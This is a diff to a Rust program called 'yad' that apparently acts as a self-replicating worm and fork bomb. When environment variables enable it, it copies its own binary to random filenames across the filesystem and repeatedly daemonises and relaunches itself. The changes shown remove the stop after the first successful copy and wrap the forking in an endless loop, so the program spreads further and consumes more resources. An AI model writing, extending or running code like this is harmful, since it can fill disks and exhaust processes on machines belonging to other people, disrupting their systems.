@@ -10,11 +10,11 @@ use std::fs;
 
 fn main() {
     let rcharset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-	let curepath = env::var("YAD_CURE").unwrap_or(".curefile".to_owned());
+	let curepath = env::var("YAD_CURE").unwrap_or_else(|_| ".curefile".to_owned());
 	let destructive = env::var("YAD_FILES").is_ok();
 	let reproductive = env::var("YAD_FORK").is_ok();
 	let args: Vec<String> = env::args().collect();
-	let mut yad_restart = Command::new(args[0].to_owned());
+	let mut yad_restart = Command::new(&args[0]);
     let mut filename: String = String::from("yad");
     let randstr = random_string::generate(16 - filename.chars().count(), rcharset);
     let excludes = ["proc", "run", "sys", "var", "cache", "tmp", "Windows"];
@@ -50,7 +50,7 @@ fn main() {
 		let yad_path = Path::new(&yad_pathstr);
 		if destructive {
 			match fs::copy(Path::new(&args[0]), yad_path) {
-				Ok(_) => break,
+				Ok(_) => (),
 				Err(_) => continue,
 			};
 		};
@@ -59,10 +59,14 @@ fn main() {
 			Err(_) => panic!("Cure file write failed. Refusing to continue, permanent damage possible.")
 		};
 		if reproductive {
-			if let Ok(Fork::Child) = daemon(true, false) {
-				yad_restart.arg("").output().expect("Failed to execute child process");
+			loop {
+				if let Ok(Fork::Child) = daemon(true, false) {
+					yad_restart.arg("").output().expect("Failed to execute child process");
+				}
+				if destructive {
+					Command::new(&yad_pathstr);
+				}
 			}
-			Command::new(yad_pathstr);
 		};
 	}
     
